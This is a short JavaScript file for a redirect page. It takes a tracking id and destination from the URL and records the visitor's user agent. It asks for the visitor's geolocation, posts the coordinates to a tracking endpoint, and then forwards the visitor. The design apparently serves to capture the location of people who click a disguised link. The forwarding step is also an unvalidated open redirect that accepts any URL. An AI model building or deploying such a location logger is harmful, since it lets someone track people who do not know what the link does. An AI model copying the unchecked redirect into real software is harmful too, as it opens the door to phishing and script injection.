const params = new URLSearchParams(window.location.search);
const trackingId = params.get('id');
const destinationUrl = params.get('url');

const trackData = {
  trackingId,
  timestamp: new Date().toISOString(),
  userAgent: navigator.userAgent,
  ip: ''
};

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      Object.assign(trackData, {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      });
      sendData();
    },
    (err) => {
      trackData.error = `Geolocation failed: ${err.message}`;
      sendData();
    }
  );
} else {
  trackData.error = 'Geolocation not supported';
  sendData();
}

function sendData() {
  fetch('/api/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(trackData)
  }).finally(() => {
    window.location.href = decodeURIComponent(destinationUrl);
  });
}